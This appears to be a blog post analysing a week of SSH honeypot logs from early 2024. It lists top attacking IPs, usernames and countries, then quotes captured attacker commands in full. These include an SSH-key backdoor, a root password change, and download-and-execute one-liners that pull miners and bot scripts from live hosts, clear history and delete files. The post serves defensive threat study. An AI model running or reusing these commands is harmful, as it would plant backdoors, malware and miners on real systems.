---
title: Bruteforce Attacks Q1 2024
description: >-
  In the first months of 2024 I have set up a cowrie honeypot to see what is new in 2024 😄.
  
  Sadly I only have backups of the last week, so the information will be based on that.
  
  The logs were at 1 point over 1 Milion lines of cowrie logs long. I wanted to build a website that will be used to look through the data and analyze but that has not been done. 
author: iacob
date: 2024-07-30
categories: [InfoSec, Statistics]
tags: [cowrie, ssh, attack, bruteforce]
pin: true
---

| Top 10 IP Addresses | Top 10 Usernames | Top 10 Countries           |
|---------------------|------------------|----------------------------|
| 185.251.91.121      | root             | China                      |
| 101.35.132.221      | 345gs5662d34     | United States of America   |
| 52.148.221.37       | test             | Russian Federation         |
| 129.146.4.225       | guest            | Hong Kong                  |
| 139.59.252.180      | admin            | Germany                    |
| 77.85.216.134       | user             | Netherlands                |
| 210.3.147.162       | oracle           | Korea (Republic of)        |
| 106.248.231.67      | hadoop           | Singapore                  |
| 190.114.253.211     | es               | Bulgaria                   |
| 1.14.46.198         | hmsftp           | Chile                      |

---

The main attacker `185.251.91.121` has tried to bruteforce the honeypot for **OVER** 1.000 times in a day, while the others ones falling behind at only 400 times and decending.

---

## Some interesting commands

---



#### Backdoor Attempt

Here there was an attempt at a backdoor

> cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3Nza[...]KPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~","message":"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAA[...]+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~


Followed by a `chattr` command to assure the file won't be modified further


> cd ~; chattr -ia .ssh; lockr -ia .ssh","message":"CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh


#### System Inspection


Display the size of the filesystem
> df -h \| head -n 2 \| awk 'FNR == 2 {print $2;}'

Get CPU model - relevant to gauge the power (maybe cryptomining)
> lscpu \| grep Model

Get the CPU cores
> cat /proc/cpuinfo \| grep model \| grep name \| wc 

Get RAM information
> free -m \| grep Mem \| awk '{print $2 ,$3, $4, $5, $6, $7}'

Taking over root account via password change
> echo \"root:bFUDiMA8REPQ\"\|chpasswd\|bash"

#### Crypto mining

Checking for existing cryptominers
> ps -ef \| grep '[Mm]iner'

Autodownload miners and execution
> #!/bin/sh; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; wget http://43.249.172.195:888/112; curl -O http://43.249.172.195:888/112; chmod +x 112; ./112; wget http://43.249.172.195:888/112s; curl -O http://43.249.172.195:888/112s; chmod +x 112s; ./112s; rm -rf 112.sh; rm -rf 112; rm -rf 112s; history -c; 


#### Downloads

 
1. > `nohup $SHELL -c \"curl http://50.17.152.237:60129/linux -o /tmp/obzJBiFkBx; if [ ! -f /tmp/obzJBiFkBx ]; then wget http://50.17.152.237:60129/linux -O /tmp/obzJBiFkBx; fi; if [ ! -f /tmp/obzJBiFkBx ]; then exec 6<>/dev/tcp/50.17.152.237/60129 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/obzJBiFkBx && chmod +x /tmp/obzJBiFkBx && /tmp/obzJBiFkBx re[...]i2gUbuecv2DxU=; fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/obzJBiFkBx && /tmp/obzJBiFkBx repOs9Q[...]ecv2DxU=\" &`

2. > `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.123.85.79/sora.sh; curl -O http://93.123.85.79/sora.sh; chmod 777 sora.sh; sh sora.sh; tftp 93.123.85.79 -c get sora.sh; chmod 777 sora.sh; sh sora.sh; tftp -r sora2.sh -g 93.123.85.79; chmod 777 sora2.sh; sh sora2.sh; ftpget -v -u anonymous -p anonymous -P 21 93.123.85.79 sora1.sh sora1.sh; sh sora1.sh; rm -rf sora.sh sora.sh sora2.sh sora1.sh; rm -rf *`